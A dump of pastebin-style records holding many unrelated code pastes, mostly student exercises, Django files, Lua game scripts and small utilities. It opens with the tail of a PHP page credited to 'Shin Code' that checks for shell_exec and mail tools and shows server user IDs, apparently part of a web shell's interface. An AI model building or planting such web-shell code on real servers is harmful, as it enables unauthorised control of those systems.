                    'Mail' => function_exists('shell_exec') && shell_exec('mail --version') ? 'On' : 'Off',
                    'cron' => function_exists('shell_exec') && shell_exec('cron --version') ? 'On' : 'Off',
                    'SendMail' => function_exists('shell_exec') && shell_exec('sendmail --version') ? 'On' : 'Off',
                ];
                ?>

                <label for=""feature-select"">Select Feature:</label>
                <select id=""feature-select"">
                    <?php foreach ($features as $feature => $status) : ?>
                        <option value=""<?php echo $feature; ?>""><?php echo $feature . ': ' . $status; ?></option>
                    <?php endforeach; ?>
                </select>
            </ul>
        </div>

        <div class=""info-container"">
            <h2>User Info</h2>
            <ul class=""info-list"">
                <li>Username: <?php echo @get_current_user(); ?></li>
                <li>User ID: <?php echo @getmyuid(); ?></li>
                <li>Group ID: <?php echo @getmygid(); ?></li>
            </ul>
        </div>
    </div>
</div>
    <script>
        function toggleOptionsMenu() {
            var optionsMenu = document.getElementById('optionsMenu');
            optionsMenu.classList.toggle('show');
        }
        
        function toggleSidebar() {
            var sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }
    </script>
</div>
<div class=""footer"">
    <p>&copy; <?php echo date(""Y""); ?> <a href=""https://www.blog-gan.org/"">Coded By</a> Shin Code.</p>
</div>
</body>
</html>"
SgPS3SeF,pyramid,excellent940707,C++,Wednesday 18th of October 2023 11:01:23 AM CDT,"#include<stdio.h>
#include<stdlib.h>
using namespace std;

int main(){
    printf(""Please input the height of your pyramid:"");
    int n;
    scanf(""%d"",&n);
    for(int i=1;i<=n;++i){
      for(int j=n-i;j;--j)printf("" "");
      for(int j=0;j<2*i-1;++j)printf(""*"");
      printf(""\n"");
    }
    return 0;
}"
XxmTvWfR,ac lab4 pb1&2,STANAANDREY,VeriLog,Wednesday 18th of October 2023 10:52:59 AM CDT,"module fac(input x, y, ci,
           output co, z);
	assign {co,z}=x+y+ci;
endmodule

module fac_tb;
	reg x, y, ci;
	wire z, co;
	fac cut(.x(x), .y(y), .ci(ci), .co(co), .z(z));
	integer k;
	initial begin
		$display(""Time\tx\ty\tci\t\tco\tz"");
		$monitor(""%0t\t%b\t%b\t%b\t\t%b\t%b"", $time, x, y, ci, co, z);
		for (k = 0; k < 8; k = k + 1) begin
			{x,y,ci} = k;
			#10;
		end
	end
endmodule"
NnhL6g3C,18102023,plarmi,Python,Wednesday 18th of October 2023 10:50:28 AM CDT,"# 1
digit1 = input(""Введите 1-ю цифру: "")
digit2 = input(""Введите 2-ю цифру: "")
digit3 = input(""Введите 3-ю цифру: "")
digits = int(digit1 + digit2 + digit3)
print(digits)

# 2
number = int(input(""Введите четырёхзначное число: ""))
digit1 = number // 1000
digit2 = (number // 100) % 10
digit3 = (number // 10) % 10
digit4 = number % 10
print(digit1 * digit2 * digit3 * digit4)

# 3
meters = int(input(""Введите кол-во метров: ""))
print(""Сантиметры:"", meters * 100, ""\nДециметр:"", meters * 10, ""\nМиллиметры:"", meters * 1000, ""\nМили:"", meters * 0.000621371)

# 4
base = int(input(""Введите основание: ""))
height = int(input(""Введите размер высоты: ""))
print(""Площадь треугольника"", 0.5 * base * height)

# 5
number = int(input(""Введите четырёхзначное число: ""))
digit1 = str(number // 1000)
digit2 = str((number // 100) % 10)
digit3 = str((number // 10) % 10)
digit4 = str(number % 10)
print(digit4 + digit3 + digit2 + digit1)

"
ckZ5SXAz,StartApplication,Farliam,Java,Wednesday 18th of October 2023 10:35:21 AM CDT,"package de.comcave.launcher3.client;

import de.comcave.basiclib.info.Header;
import de.comcave.websocket.helper.Toolkit;
import java.io.IOException;
import java.net.ServerSocket;
import java.security.Security;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/* loaded from: cc-launcher-client.jar:de/comcave/launcher3/client/StartApplication.class */
public class StartApplication {
    private static final Logger LOG = LogManager.getLogger((Class<?>) StartApplication.class);

    public static void main(String[] args) {
        String userHome = System.getProperty(Header.KEY_USER_HOME);
        String detectedOs = Toolkit.getClientOS();
        if (userHome.isEmpty()) {
            System.setProperty(Header.KEY_USER_HOME, System.getProperty(""HOME""));
            LOG.info(""Setting user.home for cc-client to:"" + System.getProperty(""HOME""));
        }
        Security.setProperty(""networkaddress.cache.ttl"", ""300"");
        Security.setProperty(""networkaddress.cache.negative.ttl"", ""0"");
        LOG.info(""networkaddress.cache.ttl="" + Security.getProperty(""networkaddress.cache.ttl""));
        LOG.info(""networkaddress.cache.negative.ttl="" + Security.getProperty(""networkaddress.cache.negative.ttl""));
        ServerSocket socket = null;
        if (""Mac"".equals(detectedOs)) {
            LauncherClient.launch(LauncherClient.class, args);
            return;
        }
        try {
            try {
                socket = new ServerSocket(59843);
                LauncherClient.launch(LauncherClient.class, args);
                if (socket != null) {
                    try {
                        socket.close();
                    } catch (Exception e) {
                        LOG.error(""Fehler beim Schließen des Launchers."");
                    }
                }
            } catch (Throwable th) {
                if (socket != null) {
                    try {
                        socket.close();
                    } catch (Exception e2) {
                        LOG.error(""Fehler beim Schließen des Launchers."");
                    }
                }
                throw th;
            }
        } catch (IOException e3) {
            LOG.error(""CCLauncher läuft bereits. Weiterer Startversuch wurde unterbunden."");
            if (socket != null) {
                try {
                    socket.close();
                } catch (Exception e4) {
                    LOG.error(""Fehler beim Schließen des Launchers."");
                }
            }
        }
    }
}"
4fV0hpXJ,Numbers,Pijomir,JavaScript,Wednesday 18th of October 2023 10:30:25 AM CDT,"function findFiveTopNumbers(singleLine) {
    let sequence = singleLine.split(' ').map(Number);
    let theAverage = sequence.reduce((a, b) => a + b) / sequence.length;
    let biggerThanAverage = sequence.filter(a => a > theAverage).sort((a, b) => b - a);
    let result = biggerThanAverage.slice(0, 5);
    console.log(result.length > 0 ? result.join(' ') : 'No');
}"
nLP4ChzS,Trasure Hunt,Pijomir,JavaScript,Wednesday 18th of October 2023 10:29:51 AM CDT,"function manageChestContent(input) {
    let chestContent = input.shift().split('|');
    let commands = {'Loot': loot, 'Drop' : drop, 'Steal': steal};

    for (let el of input) {
        let currentEl = el.split(' ');
        let currentCommand = currentEl.shift();
        if (currentCommand === 'Yohoho!') {
            break;
        }

        commands[currentCommand](chestContent, currentEl);
    }

    let treasureGain = 0;
    chestContent.forEach(a => treasureGain += a.length);
    let averageTreasureGain = treasureGain / chestContent.length;
    console.log(chestContent.length === 0 ? 'Failed treasure hunt.' : `Average treasure gain: ${averageTreasureGain.toFixed(2)} pirate credits.`);

    function loot(arr, input) {
        for ( let item of input) {
            if (!arr.includes(item)) {
                arr.unshift(item);
            }
        }
    }

    function drop(arr, index) {
        index = Number(index[0]);
        if (arr[index]) {
            let droppedLoot = arr.splice(index, 1);
            arr.push(droppedLoot[0]);
        }
    }

    function steal(arr, count) {
        count = Number(count[0]);
        let stealedItemsCount = Math.min(count, arr.length);
        let stealedItems = arr.splice(arr.length - stealedItemsCount);
        console.log(stealedItems.join(', '));
    }
}"
aUj0pfhz,Computer Store,Pijomir,JavaScript,Wednesday 18th of October 2023 10:29:05 AM CDT,"function printReceiptForComputer(input) {
    let priceWithoutTaxes = 0;
    let taxes = 0;
    let priceWithTaxes = 0;
    let typeOfClient = input.pop();
    while (input.length > 0) {
        let currentPrice = Number(input.shift());
        if (currentPrice <= 0) {
            console.log('Invalid price!');
        } else {
            priceWithoutTaxes += currentPrice;
            taxes += currentPrice * 0.2;
            priceWithTaxes += currentPrice * 1.2;
        }
    }

    if (priceWithTaxes === 0) {
        console.log('Invalid order!');
    } else {
        console.log('Congratulations you\'ve just bought a new computer!');
        console.log(`Price without taxes: ${priceWithoutTaxes.toFixed(2)}$`);
        console.log(`Taxes: ${taxes.toFixed(2)}$`);
        console.log(`${'-'.repeat(11)}`);
        console.log(`Total price: ${typeOfClient === 'regular' ? priceWithTaxes.toFixed(2) : (priceWithTaxes * 0.9).toFixed(2)}$`);
        
    }
}"
XAuxFFfV,10250 - The Other Two Trees,MiinaMagdy,C++,Wednesday 18th of October 2023 10:16:44 AM CDT,"#include <bits/stdc++.h>
#include <ext/pb_ds/assoc_container.hpp>
#include <ext/pb_ds/tree_policy.hpp>

using namespace std;
using namespace __gnu_pbds;
#define ordered_set tree<int, null_type, less<int>, rb_tree_tag, tree_order_statistics_node_update>
#define multi_ordered_set tree<int, null_type, less_equal<int>, rb_tree_tag, tree_order_statistics_node_update>
#define endl ""\n""
#define MOD 1000000007
#define INF 2000000000
#define all(s) s.begin(), s.end()
#define rall(s) s.rbegin(), s.rend()
#define sz(x) int(x.size())
#define crossProd(A,B) ((conj(A)*(B)).imag())
#define dotProd(A,B) ((conj(A)*(B)).real())

typedef long long ll;
typedef long double ld;
typedef unsigned long long ull;

#define EPS 1e-9
#define PI acos(-1)
#define X real()
#define Y imag()
#define normalize(a) (a) / length(a)
#define lengthSqr(p) dot_prod(p, p)
// #define rotateO(p, ang) p * exp(point(0, ang))
// #define rotateA(p, about, ang) rotateO(vector((about), (p)), ang) + (about)
#define reflicatO(v, m) conj(v / m) * m
#define reflicatA(v, about, m) conj(vector(about, v) / vector(about, m)) * vector(about, m) + about

template<typename T>
class point {
public:
    T x, y;
    point() {
        x = y = 0;
    }
    point(T _x, T _y) {
        x = _x;
        y = _y;
    }
    point(const point<T> &p) {
        x = p.x;
        y = p.y;
    }
    // vector from point a to point b
    point(const point<T> &a, const point<T> &b) {
        *this = b - a;
    }
    point operator=(const point<T> &p) {
        x = p.x;
        y = p.y;
        return *this;
    }
    point operator+(const point<T> &p) const {
        return point(x + p.x, y + p.y);
    }
    point operator-(const point<T> &p) const {
        return point(x - p.x, y - p.y);
    }
    // dot product
    T operator*(const point<T> &p) const {
        return x * p.x + y * p.y;
    }
    // cross product
    T operator^(const point<T> &p) const {
        return x * p.y - y * p.x;
    }
    point operator*(const T &factor) const {
        return point(x * factor, y * factor);
    }
    point operator/(const T &factor) const {
        return point(x / factor, y / factor);
    }
    friend istream &operator>>(istream &is, point<T> &p) {
        is >> p.x >> p.y;
        return is;
    }
    friend ostream &operator<<(ostream &os, const point<T> &p) {
        os << p.x << "" "" << p.y;
        return os;
    }
    bool operator==(const point<T> &p) const {
        return (x == p.x && y == p.y);
    }
    bool operator!=(const point<T> &p) const {
        return (x != p.x || y != p.y);
    }
    double arg() const {
        return atan2l(y, x);
    }
    T lenSqr() const {
        return x * x + y * y;
    }
    double len() const {
        return hypot(x, y);
    }
    // distance
    double dist(const point<T> &p) const {
        return hypot(x - p.x, y - p.y);
    }
    // distance squared
    T distSqr(const point<T> &p) const {
        return (x - p.x) * (x - p.x) + (y - p.y) * (y - p.y);
    }
    // returns 1 for counterclockwise order 
    // returns -1 for clockwise order
    // returns 0 if the points are collinear
    int orientation(const point<T> &p, const point<T> &q) const {
        T val = (q - p) ^ (*this - q);
        if (val == 0)
            return 0;
        return (val > 0) ? 1 : -1;
    }
    // check intersection between line segment p1q1 and line segment p2q2
    static bool intersect_ab_cd(point<T> a, point<T> b, point<T> c, point<T> d, point<T> &intersect) {
        point<T> u(a, b);
        point<T> v(c, d);
        point<T> w(c, a);
        T d1 = u ^ v;
        T d2 = v ^ w;
        T d3 = u ^ w;
        if (d1 == 0)
            return false;
        double t1 = d2 / d1;
        double t2 = d3 / d1;
        intersect = a + u * t1;
        return true; // e.g ab is a line, cd is a line
        // return t1 >= EPS && t2 >= EPS && t2 <= 1 + EPS; // e.g ab is a ray, cd is a segment
    }
    // rotate point by angle theta in radians counter-clockwise around origin
    point<T> rotateO(double theta) const {
        return point<T>(x * cos(theta) - y * sin(theta), x * sin(theta) + y * cos(theta));
    }
    void desmosDisplay() {
        cout << fixed << setprecision(9) << ""("" << x << "","" << y << "")"" << endl;
    }
    point<T> midPoint(point<T> p) {
        return point<T>((*this + p) / 2);
    }
};

// ab segment, c point
double segPointDist(point<double> a, point<double> b, point<double> c, point<double> &ans) {
    point<double> u(a, b), v(b, c), w(a, c);
    double d1, d2;
    if ((d1 = w * u) < -EPS) {
        ans = a;
        return a.dist(c);
    }
    if ((d2 = u * u) <= d1) {
        ans = b;
        return b.dist(c);
    }
    double t = d1 / d2;
    ans = a + u * t;
    return ans.dist(c);
}

void solve() {
    cout << fixed << setprecision(10);
    point<ld> p1, p2;
    while (cin >> p1 >> p2) {
        point<ld> mp = p1.midPoint(p2);
        p1 = p1 - mp;
        p2 = p2 - mp;
        p1 = point<ld>(-p1.y, p1.x);
        p2 = point<ld>(-p2.y, p2.x);
        cout << p1 + mp << "" "" << p2 + mp << endl;
    }
}

int main(void)
{
    ios_base::sync_with_stdio(false), cin.tie(NULL), cout.tie(NULL);
    int testcase = 1;
    // cin >> testcase;
    while (testcase--)
        solve();
    return 0;
}"
rv3qggxL,Untitled,kirkarr,Lua,Wednesday 18th of October 2023 10:11:50 AM CDT,"peripheral.find(""modem"", rednet.open)
while true do
	local id,msg = rednet.receive()
    if id ~= nil then
		if msg == ""turn"" then
			enabled = not enabled
            redstone.setOutput(""back"",enabled)
		end
    	print(id,msg)
    end
end"
TPF6BPru,Untitled,lord_shadow,TypeScript,Wednesday 18th of October 2023 10:07:31 AM CDT,"import { MessageEmbed } from 'discord.js';
import fetch from 'node-fetch'; // Install this library if not already installed
import { CommandContext } from '../../structures/addons/CommandAddons';
import { Command } from '../../structures/Command';
import { infoIconUrl, mainColor, redColor, xmarkIconUrl } from '../../handlers/locale';

class PlayertatsCommand extends Command {
    constructor() {
        super({
            trigger: 'playerstats',
            description: 'Get player statistics',
            type: 'ChatInput',
            module: 'utillity',
            args: [
                {
                    trigger: 'playerId',
                    description: 'The player ID',
                    isLegacyFlag: false,
                    required: true,
                    type: 'String',
                },
            ],
        });
    }

    async run(ctx: CommandContext) {
        const playerId = ctx.args['playerId'];
        const apiUrl = `https://api.cosmicv.net/stats/user/${playerId}`;

        try {
            const response = await fetch(apiUrl);
            if (!response.ok) {
                ctx.reply('Failed to fetch player statistics. Please try again later.');
                return;
            }

            const data = await response.json();

            if (data.status !== 200 || !data.data) {
                ctx.reply('Failed to fetch player statistics. Please verify the player ID and try again.');
                return;
            }

            const playerData = data.data.player;
            const headshots = data.data.player.stats.headshots;

            const embed = new MessageEmbed()
                .setAuthor(`Player Stats for ${playerData.username}`, infoIconUrl)
                .setColor(mainColor)
                .addFields(
                    { name: 'Username', value: `${playerData.username}`, inline: true },
                    { name: 'Prestige', value: `${playerData.prestige}`, inline: true },
                    { name: 'Competitive Rank', value: `${playerData.competitive}`, inline: true },
                    { name: 'Total XP', value: `${playerData.xp}`, inline: true },
                    { name: 'Total Money', value: `$${playerData.money.toLocaleString()}`, inline: true },
                    { name: 'First Joined', value: new Date(playerData.created_at).toDateString(), inline: true },
                    { name: 'Headshots', value: `${playerData.stats[""headshots""]}`, inline: true },
                );

                if (playerData.stats && playerData.stats.Level !== undefined) {
                    embed.addField('Level', `${playerData.stats.Level}`, true);
                }
                
                if (playerData.last_joined !== undefined) {
                    embed.addField('Last Joined', new Date(playerData.last_joined * 1000).toDateString(), true);
                }

            ctx.reply({ embeds: [embed] });
        } catch (error) {
            console.error(error);
            
            const errorEmbed = new MessageEmbed()
            .setAuthor(`Error`, xmarkIconUrl)
            .setDescription(`An error occurred while fetching player statistics from CosmicV`)
            .setColor(redColor)
            .setTimestamp();
            ctx.reply({ embeds: [errorEmbed] });
        }
    }
}

export default PlayertatsCommand;"
VrprLNxM,editor game grid | unity3d,halleman19,C#,Wednesday 18th of October 2023 09:47:51 AM CDT,"#if UNITY_EDITOR

using UnityEngine;
using UnityEditor;

public class EGenericGrid : EditorWindow
{
    public GameObject obj;

    [MenuItem(""tools/editor grid"")]
    public static void ShowEditorGridWind()
    {
        EGenericGrid wind = GetWindow<EGenericGrid>();
        wind.titleContent = new GUIContent(""Tool for generic game grid"");
        wind.maxSize = new Vector2( 350, 250 );
        wind.minSize = wind.maxSize;
    }

    private GUISkin skin;

    private string verLengthSize = ""0"";
    private string horLengthSize = ""0"";

    private string status = ""waiting for data input"";

    private string pathToPrefab = ""debug/ed/tile"";

    private string warningMsg = ""Change const gridLength in GameGrid.cs"";

    private void Awake()
    {
        skin = Resources.Load(""debug/ed/edSkin"") as GUISkin;
    }

    private void OnGUI()
    {
        GUI.skin = skin;

        GUI.Box(new Rect(25, 10, 300, 40), new GUIContent(""Enter data for grid""));

        GUI.Label(new Rect(10, 55, 200, 30), ""Enter length grid (vertical)"");
        GUI.Label(new Rect(10, 90, 200, 30), ""Enter length grid (horizontal)"");

        verLengthSize = GUI.TextField(new Rect(230, 55, 100, 30), verLengthSize);
        horLengthSize = GUI.TextField(new Rect(230, 90, 100, 30), horLengthSize);

        GUI.Label(new Rect(25, 125, 300, 30), status);

        if (GUI.Button(new Rect(75, 160, 200, 40), new GUIContent(""Generic"")))
        {
            int x; int y;

            if (!int.TryParse(verLengthSize, out x) || x <= 0)
            {
                status = ""correct input vertical length grid"";
                return;
            }

            if (!int.TryParse(horLengthSize, out y) || y <= 0)
            {
                status = ""correct input horizontal length grid"";
                return;
            }

            status = ""start generic"";


            genericGrid(x, y);
        }

        GUI.Box(new Rect(25, 205, 300, 40), warningMsg, skin.FindStyle(""warning""));
        
    }

    private void genericGrid(int x, int y)
    {
        if (!System.IO.File.Exists(string.Format(""Assets/Resources/{0}{1}"", pathToPrefab, "".prefab"")))
        {
            status = ""no find prefab tile"";
            return;
        }

        status = ""run process generic"";

        GameObject parrObj = GameObject.CreatePrimitive(PrimitiveType.Cube);
        parrObj.name = ""grid-game"";

        Component[] components = parrObj.GetComponents(typeof(Component));

        foreach (Component comp in components)
        {
            if (comp.GetType() == typeof(Transform))
                continue;

            DestroyImmediate(comp);
        }

        GameObject tile = Resources.Load<GameObject>(pathToPrefab);

        float size = tile.transform.localScale.x;

        for (int i = 0; i < x; i++)
        {
            for (int j = 0; j < y; j++)
            {
                Transform tileObj = Instantiate(tile, new Vector3(0, 0, 0), Quaternion.identity).GetComponent<Transform>();
                tileObj.SetParent(parrObj.transform);
                tileObj.position = new Vector3(-0.5f + (j * size), 0.5f, 0.5f - (i * size));
                tileObj.name = string.Format(""tile {0} {1}"", i, j);
                tileObj.GetComponent<Tile>().setCord(i, j);
            }
        }

        Debug.LogWarning(warningMsg);
    }
}

#endif"
z4614Hdk,hmurl.py,mattia89,Python,Wednesday 18th of October 2023 09:45:20 AM CDT,"from django.urls import path
from . import views

urlpatterns = [
    path('', views.homepage, name='homepage' ),
    path('gallery', views.gallery, name='gallery'),
    path('property/<str:pk>', views.property, name='property'),
    path('upload', views.upload, name='upload')
]"
JVdiQckj,models.py,mattia89,Python,Wednesday 18th of October 2023 09:44:31 AM CDT,"from django.db import models

# Create your models here.

class Property(models.Model):

    title = models.CharField(max_length=99, verbose_name='Titolo')
    city = models.CharField(max_length=99, verbose_name='Città')
    description = models.TextField(verbose_name='Descrizione')
    thumbnail = models.ImageField(verbose_name='Immagine di copertina')
    virtual_tour = models.CharField(max_length=99,
                                    verbose_name='Link Virtual Tour',
                                    help_text='Inserire il link Matterport')

    class Meta:
        verbose_name = (""Immobile"")
        verbose_name_plural = (""Immobili"")

    def __str__(self):
        return self.title


class Photo(models.Model):

    city = models.ForeignKey(Property, on_delete=models.CASCADE, null=True, blank=True)
    image = models.ImageField(blank=False, null=False)
    description = models.TextField(default='Galleria Immagini')

    class Meta:
        verbose_name = (""Foto"")
        verbose_name_plural = (""Foto"")

    def __str__(self):
        return str(self.description) + ' di ' + str(self.city)
"
dvsYhE8j,view.py,mattia89,Python,Wednesday 18th of October 2023 09:43:52 AM CDT,"from django.shortcuts import render
from .models import *

# Create your views here.

def homepage(request):

    context = {}

    return render(request, 'index.html', context)


def gallery(request):

    city = request.GET.get('city')
    if city == None:
        photos = Photo.objects.all()
    else:
        photos = Photo.objects.filter(city__name = city)

    
    properties = Property.objects.all()
    context = { 'properties' : properties,'photos': photos }

    return render(request, 'gallery.html', context)


def property(request, pk):

    property = Property.objects.get(id=pk)

    photos = Photo.objects.all()
    
    context = { 'property':property, 'photos':photos}

    return render(request, 'property.html', context)


def upload(request):

    context = {}

    return render(request, 'upload.html', context)"
K8vFN9bb,property.html,mattia89,Python,Wednesday 18th of October 2023 09:43:15 AM CDT,"{% extends ""base.html"" %}
{% load static %}

{% block content %}

<div class=""container m-5"">
    <div class=""row"">
        <div class=""col-md-3"">
            <div class=""card"">
                <div class=""card-header"">
                  Città 
                </div>
                <ul class=""list-group list-group-flush"">
                    <li class=""list-group-item"">
                      <a href=""{% url 'gallery' %}"">Tutte le Città</a>
                    </li>

                    {% for property in properties %}
                      <li class=""list-group-item"">
                        <a href=""{% url 'gallery'%}?city={{property.city}}"">{{property.city}}</a>
                      </li>
                    {% endfor %}

                    <li class=""list-group-item d-grid gap-2"">
                        <a href=""{% url 'upload' %}"" class=""btn btn-dark btn-bg "">Inserisci Immobile</a>
                    </li>
                </ul>
            </div>
        </div>
        <div class=""col-md-9"">
            <div class=""row"">
              {% for property in properties %}
                <div class=""col-md-4"">
                    <div class=""card my-2"">
                        <img class=""thunbnail-image"" src=""{{property.thumbnail.url}}"" class=""card-img-top"" alt=""..."">
                        <div class=""card-body"">
                          <p class=""card-text"">Titolo : {{property.title}}</p>
                        </div>
                        <a href=""{% url 'property' property.id %}"" class=""btn btn-primary btn-sm m-1"">Galleria Immagini</a>
                        <a href=""{{property.virtual_tour}}"" target=""_blank"" class=""btn btn-primary btn-sm m-1"">VirtualTour</a>
                    </div>
                </div>
              {% empty %}
              <h3> Nessun Immobile Inserito ... </h3>
              {% endfor %}
            </div>
        </div>
    </div>
</div>

{% endblock content %}"
MeUQtjWX,property.html,mattia89,Python,Wednesday 18th of October 2023 09:41:35 AM CDT,"{% extends ""base.html"" %}
{% load static %}

{% block content %}

<div class=""container"">
    <div class=""row justify-content-center my-5"">
        <div class=""col-md-2"">
            <a href=""{% url ""gallery"" %}"" class=""btn btn-outline-dark m-2"">Indietro</a>
        </div>
        <div class=""col-md-5"">
            <h1>{{ property.title }}</h1>
            <br>
            <p>{{ property.description }}</p>
        </div>
        <div class=""col-md-5"">
            <img src=""{{property.thumbnail.url}}"" class=""card-img-top"" alt="""">
        </div>
    </div>
</div>

<div class=""container"">
    <h3 class='text-center my-3'>Galleria Immagini</h3>
    {% for photo in photos %}
    <div class=""card"">
        <img src=""{{photo.image.url}}"" class=""card-img-top"" alt="""">
    </div>
    {% endfor %}
</div>

{% endblock content %}"
SJVWrrX1,LAB3_FIC,Bobita,Z80 Assembler,Wednesday 18th of October 2023 09:41:15 AM CDT,"        INP R0,2
LOOP    INP R1,2
        ADD R2,#1
        CMP R0,R2
        BNE LOOP
        HLT
"
ub1zh29M,Pumpkin Farm,JustDoesGames,Lua,Wednesday 18th of October 2023 09:28:49 AM CDT,"if not fs.exists(""/cfg.lua"") then local f = fs.open(""cfg.lua"", ""w"") f.close() end
local f = fs.open(""cfg.lua"",""r"")
if f then t = textutils.unserialize(f.readAll()) f.close() end

if not t then t = {} end
if not t.mined then t.mined = 0 end

term.clear()
while true do
	term.setCursorPos(1,1)
	print(""Pumpkins Harvested: ""..t.mined)

	local r,i = turtle.inspect()
	if r then
		if i.name == ""minecraft:pumpkin"" then
			turtle.dig()
			t.mined = t.mined + 1
			
			local f = fs.open(""cfg.lua"", ""w"")
			f.write(textutils.serialize(t)) f.close()

			turtle.dropDown()
		end
	end
	turtle.turnRight()
	sleep(.2)
end

"
KUspdWPH,Untitled,Mpa3b,PHP,Wednesday 18th of October 2023 09:28:09 AM CDT,"<?php
    
    use Bitrix\Main\Context;
    
    class BxWebformAjaxHelper
    {
    
        public static function addResult(int $formID)
        {
    
            $request = Context ::getCurrent() -> getRequest();
        
            ob_end_clean();
        
            header(""Content-Type: application/json"");
        
            $formData = $request -> getQueryList();
        
            $formErrors = CForm ::Check($formID, $formData, false, 'Y', 'Y');
        
            $result = [
                'success' => false
            ];
        
            if ($formErrors) {
            
                $result['errors'] = $formErrors;
            
            } else {
            
                $resultID = (new CFormResult) -> Add($formID, $formData);
            
                (new CFormResult) -> SetEvent($resultID);
                (new CFormResult) -> Mail($resultID);
            
                CFormCRM ::onResultAdded($formID, $resultID);
            
                $result['id']      = $resultID;
                $result['success'] = true;
            
            }
        
            echo json_encode($result, JSON_UNESCAPED_UNICODE);
        
            die();
        
        }
    
    }
"
QZZT5tpZ,Ex suma vecinilor < elementul actual din matrice,ToniDev,C++,Wednesday 18th of October 2023 09:11:03 AM CDT,"#include <iostream>
using namespace std;

void populateMatrix(int m[][10], int n)
{
	int counter = 1;

	for (int i = 0; i < n; i++)
	{
		for (int j = 0; j < n; j++)
		{
			m[i][j] = counter;
			counter++;
		}
	}

	cout << ""Matrix populated successfully!"" << endl;
}

void showMatrix(int m[][10], int n)
{
	cout << ""Matrix display: "" << endl;

	for (int i = 0; i < n; i++)
	{
		for (int j = 0; j < n; j++)
		{
			cout << m[i][j] << ""\t"";
		}
		cout << endl;
	}
}

int calculate(int m[][10], int n)
{
	// Check the neighbour values for each element, and if the element is greater than all of them, sum it up
	int sum = 0;

	for (int i = 1; i < n - 1; i++)
	{
		for (int j = 1; j < n - 1; j++)
		{
		}
	}

	return sum;
}

int main() {
	int matrix[10][10];
	int n; // Rows and columns, since it's a square matrix

	cout << ""Enter the number of rows and columns: "";
	cin >> n;

	populateMatrix(matrix, n);
	showMatrix(matrix, n);

	cout << ""The sum of the elements that are greater than all their neighbours is: "" << calculate(matrix, n) << endl;

	return 0;
}
"
DLrZBGCs,loh33,HaoAsakura,C#,Wednesday 18th of October 2023 08:48:07 AM CDT,"using System;
using System.Collections.Generic;

namespace PracticingPolygon
{
    public abstract class id  //sozdaem abstract class
    {
        public abstract int Id { get; set; }
    }
    public class Pc : id
    {
        public override int Id { get; set; }
        public string name { get; private set; }

        public Pc(int Id, string name)
        { this.Id = Id; this.name = name; }

    }
    public class Kabinet : id
    {
        public override int Id { get; set; }
        public string name { get; private set; }
        public List<Pc> Computers = new List<Pc>();
        public Kabinet(int id, string name, List<Pc> computers)
        {
            this.Id = id;
            this.name = name;
            this.Computers = computers;
        }
        public static void GetComputerFromKabinet(List<Kabinet> kabinets, int id)
        {
            for (int i = 0; i < kabinets.Count; i++)
            {
                for (int k = 0; k < kabinets[i].Computers.Count; k++)
                {
                    if (kabinets[i].Computers[k].Id == id)
                        Console.WriteLine($""Компьютер({kabinets[i].Computers[k].name}) "" +
                            $""{kabinets[i].Computers[k].Id} "" +
                            $""был найден в кабинете №{kabinets[i].Id}({kabinets[i].name})"");
                }
            }
        }
    }

    internal class Program
    {
        static void Main(string[] args)
        {
            List<Kabinet> kabinets = new List<Kabinet>()
            {
                new Kabinet(1,""Химия"",new List<Pc>()
                {
                    new Pc(136,""Асус топ 31 вива букк""),
                    new Pc(1599, ""Марин Турбо 5к""),
                    new Pc(33, ""UTM super nout 313"")
                }),
                new Kabinet(55,""Биология"",new List<Pc>()
                {
                    new Pc(6343,""31ok""),
                    new Pc(159, ""tubro33""),
                    new Pc(13, ""loh1"")
                })
            };

            Console.Write(""Введите id компьютера который хотите найти: "");
            int id = int.Parse(Console.ReadLine());

            Kabinet.GetComputerFromKabinet(kabinets, id);
        }
    }
}"
0K0CaJYR,Suma vecinilor diagonalei principale,ToniDev,C++,Wednesday 18th of October 2023 08:48:06 AM CDT,"#include <iostream>
using namespace std;

void citire(int a[][100], int& n) {
    cout << ""Introdu nr de linii si coloane: "";  cin >> n;
    for (int i = 0; i < n; i++) {
        for (int j = 0; j < n; j++) {
            cout << ""a["" << i << ""]["" << j << ""] = "";
            cin >> a[i][j];
        }
    }
}

void suma(int a[][100], int n) {
    int sum = 0;
    for (int i = 0; i < n; i++) {
        for (int j = 0; j < n; j++) {
            if (i == 0 && j == 0) continue; // next iteration
            else {
                if (i == j) {
                    sum += a[i][j - 1] + a[i - 1][j];

                }
            }
        }
    }
    cout << ""Suma vecinilor diagonalei principale este: "" << sum << endl;
}

int main() {
    int n, a[100][100], sum;
    citire(a, n);
    suma(a, n);
    return 0;
}
"
vS3xRQSR,Untitled,promitheus_sal,C++,Wednesday 18th of October 2023 08:47:17 AM CDT,"typedef struct point {
    int x,y;
    point(int a, int b): x{a},y{b} {}
} point;

int ccw(const point& a, const point& b, const point& c) {
    return (b.x-a.x)*(c.y-a.y)-(c.x-a.x)*(b.y-a.y);
}

double dist(const point& a, const point& b) {
    int dx = a.x-b.x;
    int dy = a.y-b.y;
    return sqrt(dy*dy+dx*dx);
}

int N;
int main() {
    scanf(""%d"",&N);
    vector<point> A;
    vector<point> B;
    for(int i=0;i<N;i++) {
        int a,b;
        scanf(""%d%d"",&a,&b);
        A.push_back(point(a,b));
    }
    sort(A.begin(),A.end(),(const point&a,const point& b) {
        return a.y!=b.y?a.y<b.y:a.x<b.x;
    });
    point sa = A[0];

    sort(A.begin()+1,A.end(),(const point&a , const point&b) {
        ccw(sa,a,b)<0;
    });
    
    vector<point> gs;
    gs.push_back(A[0]);
    gs.push_back(A[1]);
    for(int i=2;i<N;i++) {
        gs.push_back(A[i]);
        while(true) {
            int n = gs.size();
            if(ccw(gs[n-2],gs[n-1],gs[n-3])>0) {
                gs[n-2]=gs[n-1];
                gs.pop_back();
            }
            else break;
        }
    }

    point old=gs[N-1];
    double len = 0.0;
    for(int i=0;i<N;i++) {
        len+=dist(old,gs[i]);
    }
    long long int a = round(len);
    printf(""%lld\n"",a);
    return 0;
}"
nSDxdKbj,rising home,thequeenroyal,CSS,Wednesday 18th of October 2023 08:24:25 AM CDT,"@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono&family=IBM+Plex+Serif&family=Abril+Fatface&family=Montserrat:wght@500;900&family=Poppins:wght@500;900&family=Playfair+Display:ital,wght@1,900&display=swap');
@font-face {
   font-family: ""Couture""; 
  src: url(https://dl.dropbox.com/s/uooxtl95ioyu2f9/couture-bld.otf);
 format(""truetype""); }
/* latin-ext */
@font-face {
  font-family: 'Montserrat';
